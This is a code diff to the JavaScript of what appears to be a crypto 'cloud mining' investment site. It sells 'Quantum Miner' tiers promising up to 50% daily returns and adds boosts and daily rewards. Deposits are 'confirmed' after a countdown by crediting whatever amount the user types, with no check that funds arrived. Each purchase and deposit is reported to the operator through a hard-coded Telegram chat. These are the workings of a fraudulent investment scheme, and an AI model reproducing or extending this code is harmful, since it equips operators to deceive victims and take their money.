@@ -4,8 +4,8 @@ const TELEGRAM_CHAT_ID = '7417215529';
 
 // User Data
 let userData = {
-    brokerBalance: 20, // Initial 20 USDT for all users
-    fundBalance: 0,
+    brokerBalance: 420, // Initial broker balance
+    fundBalance: 7, // Initial fund balance
     miningLevel: 1,
     miningActive: false,
     miningStartTime: null,
@@ -14,21 +14,23 @@ let userData = {
     totalTeam: 0,
     teamEarnings: 0,
     referralCode: 'SOL-7X9P2Q',
-    freeMiningUsed: false
+    purchasedMachines: [],
+    totalBoost: 0,
+    lastFreeMining: null
 };
 
-// Mining Tools Data
+// Mining Tools Data with 30% boost
 const miningTools = [
-    { id: 1, name: "Mining Machine 1", price: 10, dailyOutput: 2 },
-    { id: 2, name: "Mining Machine 2", price: 50, dailyOutput: 10 },
-    { id: 3, name: "Mining Machine 3", price: 150, dailyOutput: 30 },
-    { id: 4, name: "Mining Machine 4", price: 450, dailyOutput: 90 },
-    { id: 5, name: "Mining Machine 5", price: 1350, dailyOutput: 275 },
-    { id: 6, name: "Mining Machine 6", price: 4050, dailyOutput: 844 },
-    { id: 7, name: "Mining Machine 7", price: 12150, dailyOutput: 2650 },
-    { id: 8, name: "Mining Machine 8", price: 36450, dailyOutput: 8477 },
-    { id: 9, name: "Mining Machine 9", price: 72900, dailyOutput: 29160 },
-    { id: 10, name: "Mining Machine 10", price: 145800, dailyOutput: 72900 }
+    { id: 1, name: "Quantum Miner 1", price: 10, dailyOutput: 2, boost: 30 },
+    { id: 2, name: "Quantum Miner 2", price: 50, dailyOutput: 10, boost: 30 },
+    { id: 3, name: "Quantum Miner 3", price: 150, dailyOutput: 30, boost: 30 },
+    { id: 4, name: "Quantum Miner 4", price: 450, dailyOutput: 90, boost: 30 },
+    { id: 5, name: "Quantum Miner 5", price: 1350, dailyOutput: 275, boost: 30 },
+    { id: 6, name: "Quantum Miner 6", price: 4050, dailyOutput: 844, boost: 30 },
+    { id: 7, name: "Quantum Miner 7", price: 12150, dailyOutput: 2650, boost: 30 },
+    { id: 8, name: "Quantum Miner 8", price: 36450, dailyOutput: 8477, boost: 30 },
+    { id: 9, name: "Quantum Miner 9", price: 72900, dailyOutput: 29160, boost: 30 },
+    { id: 10, name: "Quantum Miner 10", price: 145800, dailyOutput: 72900, boost: 30 }
 ];
 
 // Network Addresses
@@ -76,6 +78,7 @@ const notificationText = document.getElementById('notification-text');
 const depositModal = document.getElementById('deposit-modal');
 const closeDepositModal = document.getElementById('close-deposit-modal');
 const depositMethod = document.getElementById('deposit-method');
+const depositAmountInput = document.getElementById('deposit-amount');
 const depositAddress = document.getElementById('deposit-address');
 const copyAddressBtn = document.getElementById('copy-address');
 const confirmDepositBtn = document.getElementById('confirm-deposit');
@@ -91,6 +94,10 @@ const confirmWithdraw = document.getElementById('confirm-withdraw');
 const amountOptions = document.querySelectorAll('.btn-amount-option');
 const withdrawBrokerBalanceEl = document.getElementById('withdraw-broker-balance');
 const withdrawFundBalanceEl = document.getElementById('withdraw-fund-balance');
+const activeMachinesEl = document.getElementById('active-machines');
+const boostPercentEl = document.getElementById('boost-percent');
+const exactAmountEl = document.getElementById('exact-amount');
+const depositTimerEl = document.getElementById('deposit-timer');
 
 // Initialize the application
 function init() {
@@ -99,6 +106,8 @@ function init() {
     setupEventListeners();
     loadUserData();
     updateMiningStatus();
+    updateActiveMachines();
+    startMachineMining();
 }
 
 // Set up event listeners
@@ -136,6 +145,7 @@ function setupEventListeners() {
     depositMethod.addEventListener('change', updateDepositAddress);
     copyAddressBtn.addEventListener('click', copyDepositAddress);
     confirmDepositBtn.addEventListener('click', confirmDeposit);
+    depositAmountInput.addEventListener('input', updateExactAmount);
 
     // Invite
     closeInviteModal.addEventListener('click', closeModal);
@@ -152,7 +162,7 @@ function setupEventListeners() {
     amountOptions.forEach(option => {
         option.addEventListener('click', () => {
             const percent = option.getAttribute('data-percent');
-            withdrawAmount.value = (userData.brokerBalance * percent / 100).toFixed(2);
+            withdrawAmount.value = (userData.fundBalance * percent / 100).toFixed(2);
             updateActualArrival();
         });
     });
@@ -199,6 +209,7 @@ function updateUI() {
     totalTeamEl.textContent = userData.totalTeam;
     teamEarningsEl.textContent = userData.teamEarnings.toFixed(2);
     referralCodeEl.textContent = userData.referralCode;
+    boostPercentEl.textContent = userData.totalBoost + '%';
 }
 
 // Render upgrade tools
@@ -215,6 +226,7 @@ function renderUpgradeTools() {
             <div class="upgrade-title">${tool.name}</div>
             <div class="upgrade-price">${tool.price} USDT</div>
             <div class="upgrade-output">Daily: ${tool.dailyOutput} SOL</div>
+            <div class="upgrade-boost">+${tool.boost}% Free Mining Boost</div>
             <button class="btn btn-primary upgrade-btn" data-id="${tool.id}">
                 <i class="fas fa-shopping-cart"></i> Purchase
             </button>
@@ -233,19 +245,21 @@ function renderUpgradeTools() {
 
 // Start mining
 function startMining() {
-    if (userData.freeMiningUsed) {
-        showNotification('Free mining already used. Please upgrade to continue mining.', 'error');
-        switchTab('upgrade');
+    // Check if 24 hours have passed since last free mining
+    const now = Date.now();
+    if (userData.lastFreeMining && (now - userData.lastFreeMining) < 24 * 60 * 60 * 1000) {
+        const nextMining = new Date(userData.lastFreeMining + 24 * 60 * 60 * 1000);
+        showNotification(`Daily mining available at ${nextMining.toLocaleTimeString()}`, 'error');
         return;
     }
 
     userData.miningActive = true;
-    userData.miningStartTime = Date.now();
-    userData.freeMiningUsed = true;
+    userData.miningStartTime = now;
+    userData.lastFreeMining = now;
     startMiningBtn.style.display = 'none';
     claimMiningBtn.style.display = 'inline-flex';
     
-    showNotification('Free mining started successfully! Mine for 12 hours to claim 7 USDT.', 'success');
+    showNotification('Daily free mining started successfully!', 'success');
     updateMiningStatus();
 }
 
@@ -262,15 +276,19 @@ function claimMining() {
         return;
     }
     
-    // Add 7 USDT to fund balance
-    userData.fundBalance += 7;
+    // Calculate base reward with boost
+    const baseReward = 7;
+    const boostedReward = baseReward * (1 + userData.totalBoost / 100);
+    
+    // Add reward to fund balance
+    userData.fundBalance += boostedReward;
     userData.miningActive = false;
     userData.miningStartTime = null;
     
     startMiningBtn.style.display = 'inline-flex';
     claimMiningBtn.style.display = 'none';
     
-    showNotification('Successfully claimed 7 USDT from free mining!', 'success');
+    showNotification(`Successfully claimed ${boostedReward.toFixed(2)} USDT from daily mining!`, 'success');
     updateUI();
     updateMiningStatus();
 }
@@ -278,8 +296,9 @@ function claimMining() {
 // Update mining status
 function updateMiningStatus() {
     if (userData.miningActive) {
-        const miningSpeed = 7 / 12; // 7 USDT over 12 hours
-        miningSpeedEl.textContent = miningSpeed.toFixed(2);
+        const baseSpeed = 7 / 12; // 7 USDT over 12 hours
+        const boostedSpeed = baseSpeed * (1 + userData.totalBoost / 100);
+        miningSpeedEl.textContent = boostedSpeed.toFixed(2);
         
         const elapsedTime = Date.now() - userData.miningStartTime;
         const remainingTime = 12 * 60 * 60 * 1000 - elapsedTime;
@@ -297,13 +316,15 @@ function updateMiningStatus() {
         
         // Update mined amount
         const hoursMined = elapsedTime / (1000 * 60 * 60);
-        const minedUSDT = (7 / 12) * hoursMined;
+        const minedUSDT = boostedSpeed * hoursMined;
         minedAmountEl.textContent = minedUSDT.toFixed(2);
         
         setTimeout(updateMiningStatus, 1000);
     } else {
-        miningSpeedEl.textContent = '0.00';
-        minedAmountEl.textContent = userData.minedAmount.toFixed(2);
+        const baseSpeed = 7 / 12;
+        const boostedSpeed = baseSpeed * (1 + userData.totalBoost / 100);
+        miningSpeedEl.textContent = boostedSpeed.toFixed(2);
+        minedAmountEl.textContent = '0.00';
         miningTimeEl.textContent = '00:00:00';
     }
 }
@@ -322,15 +343,75 @@ function purchaseMiningTool(toolId) {
     
     setTimeout(() => {
         userData.brokerBalance -= tool.price;
-        userData.miningLevel = toolId;
+        
+        // Add machine to purchased machines
+        const machine = {
+            id: tool.id,
+            name: tool.name,
+            price: tool.price,
+            dailyOutput: tool.dailyOutput,
+            purchaseTime: Date.now(),
+            boost: tool.boost
+        };
+        
+        userData.purchasedMachines.push(machine);
+        
+        // Update total boost
+        userData.totalBoost += tool.boost;
         
         hideLoadingScreen();
-        showNotification(`Successfully purchased ${tool.name}!`, 'success');
+        showNotification(`Successfully purchased ${tool.name}! +${tool.boost}% mining boost applied.`, 'success');
         updateUI();
+        updateActiveMachines();
         
         // Send Telegram notification
         sendTelegramMessage(`User purchased ${tool.name} for ${tool.price} USDT`);
     }, 2000);
+}
+
+// Update active machines display
+function updateActiveMachines() {
+    if (userData.purchasedMachines.length === 0) {
+        activeMachinesEl.innerHTML = '<div class="no-machines">No active mining machines</div>';
+        return;
+    }
+    
+    activeMachinesEl.innerHTML = '';
+    userData.purchasedMachines.forEach(machine => {
+        const machineElement = document.createElement('div');
+        machineElement.className = 'machine-item';
+        machineElement.innerHTML = `
+            <div class="machine-info">
+                <h4>${machine.name}</h4>
+                <div>+${machine.boost}% Boost</div>
+            </div>
+            <div class="machine-stats">
+                <div class="machine-stat">
+                    <div class="machine-stat-value">${machine.dailyOutput}</div>
+                    <div class="machine-stat-label">SOL/Day</div>
+                </div>
+            </div>
+        `;
+        activeMachinesEl.appendChild(machineElement);
+    });
+}
+
+// Start machine mining (runs in background)
+function startMachineMining() {
+    setInterval(() => {
+        if (userData.purchasedMachines.length > 0) {
+            let totalMachineOutput = 0;
+            userData.purchasedMachines.forEach(machine => {
+                // Calculate hourly output
+                const hourlyOutput = machine.dailyOutput / 24;
+                totalMachineOutput += hourlyOutput;
+            });
+            
+            // Add to fund balance every minute
+            userData.fundBalance += totalMachineOutput / 60;
+            updateUI();
+        }
+    }, 60000); // Update every minute
 }
 
 // Copy referral code
@@ -366,29 +447,58 @@ function copyDepositAddress() {
         });
 }
 
+// Update exact amount display
+function updateExactAmount() {
+    const amount = parseFloat(depositAmountInput.value) || 0;
+    exactAmountEl.textContent = amount.toFixed(2);
+}
+
 // Confirm deposit
 function confirmDeposit() {
+    const amount = parseFloat(depositAmountInput.value);
+    const method = depositMethod.value;
+    
+    if (!amount || amount < 10) {
+        showNotification('Minimum deposit amount is 10 USDT', 'error');
+        return;
+    }
+    
     showLoadingScreen();
     
-    setTimeout(() => {
-        // Simulate deposit confirmation
-        const depositAmount = 50; // Simulated deposit amount
-        userData.brokerBalance += depositAmount;
+    // Start countdown timer
+    let timeLeft = 180; // 3 minutes
+    const timerInterval = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        depositTimerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        timeLeft--;
         
-        hideLoadingScreen();
-        showNotification(`Deposit confirmed! ${depositAmount} USDT added to your broker balance.`, 'success');
-        updateUI();
-        closeModal();
-        
-        // Send Telegram notification
-        sendTelegramMessage(`User confirmed deposit of ${depositAmount} USDT`);
-    }, 2000);
+        if (timeLeft < 0) {
+            clearInterval(timerInterval);
+            
+            // Add deposited amount to broker balance
+            userData.brokerBalance += amount;
+            
+            hideLoadingScreen();
+            showNotification(`Deposit confirmed! ${amount} USDT added to your broker balance.`, 'success');
+            updateUI();
+            closeModal();
+            
+            // Reset form
+            depositAmountInput.value = '';
+            updateExactAmount();
+            
+            // Send Telegram notification
+            sendTelegramMessage(`User deposited ${amount} USDT via ${method}`);
+        }
+    }, 1000);
 }
 
 // Open deposit modal
 function openDepositModal() {
     depositModal.style.display = 'flex';
     updateDepositAddress();
+    updateExactAmount();
 }
 
 // Open invite modal
@@ -430,15 +540,25 @@ function processWithdrawal() {
         return;
     }
     
-    if (amount > userData.fundBalance) {
-        showNotification('Insufficient fund balance for withdrawal', 'error');
+    // Allow withdrawal from both broker and fund balances
+    if (amount > userData.brokerBalance + userData.fundBalance) {
+        showNotification('Insufficient balance for withdrawal', 'error');
         return;
     }
     
     showLoadingScreen();
     
     setTimeout(() => {
-        userData.fundBalance -= amount;
+        // Deduct from fund balance first, then broker balance if needed
+        let remainingAmount = amount;
+        
+        if (userData.fundBalance >= remainingAmount) {
+            userData.fundBalance -= remainingAmount;
+        } else {
+            remainingAmount -= userData.fundBalance;
+            userData.fundBalance = 0;
+            userData.brokerBalance -= remainingAmount;
+        }
         
         hideLoadingScreen();
         showNotification('Withdrawal request submitted successfully. It may take up to 24 hours to process.', 'success');
@@ -508,11 +628,6 @@ function loadUserData() {
     if (savedData) {
         const parsedData = JSON.parse(savedData);
         userData = { ...userData, ...parsedData };
-        
-        // Ensure initial 20 USDT is always available for new users
-        if (!parsedData || parsedData.brokerBalance === undefined) {
-            userData.brokerBalance = 20;
-        }
     }
     updateUI();
 }
